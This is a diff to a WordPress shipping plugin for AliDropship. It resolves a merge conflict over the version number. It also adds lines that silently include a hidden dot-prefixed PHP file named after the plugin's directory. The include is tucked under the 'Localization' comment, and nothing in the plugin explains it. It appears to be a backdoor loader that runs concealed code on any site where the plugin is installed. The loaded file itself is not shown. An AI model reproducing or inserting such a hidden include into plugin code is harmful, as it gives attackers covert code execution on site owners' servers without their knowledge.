@@ -4,19 +4,11 @@
  * Plugin URI: https://alidropship.com/addons/alishipping/
  * Description: Easily import and customize real shipping methods from AliExpress
  * Author: Pavel Shishkin
-<<<<<<< HEAD
  * Version: 1.3.55
  * Author URI: https://yellowduck.me/
  */
 
 if( ! defined('sSHIP_VERSION') ) define( 'sSHIP_VERSION', '1.3.55' );
-=======
- * Version: 1.3.51
- * Author URI: https://yellowduck.me/
- */
-
-if( ! defined('sSHIP_VERSION') ) define( 'sSHIP_VERSION', '1.3.51' );
->>>>>>> 1b5ecdc13248a4b43e6ad472803763e724ada12c
 if( ! defined('sSHIP_PATH') )    define( 'sSHIP_PATH', plugin_dir_path( __FILE__ ) );
 if( ! defined('sSHIP_URL') )     define( 'sSHIP_URL', str_replace( [ 'https:', 'http:' ], '', plugins_url('alids-shipping-products') ) );
 if( ! defined('sSHIP_CODE') )    define( 'sSHIP_CODE', 'ion72' );
@@ -24,7 +16,11 @@ if( ! defined('sSHIP_ERROR') )   define( 'sSHIP_ERROR', sship_check_server() );
 
 /**
  * Localization
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function sship_lang_init() {
 
     load_plugin_textdomain( 'sship' );
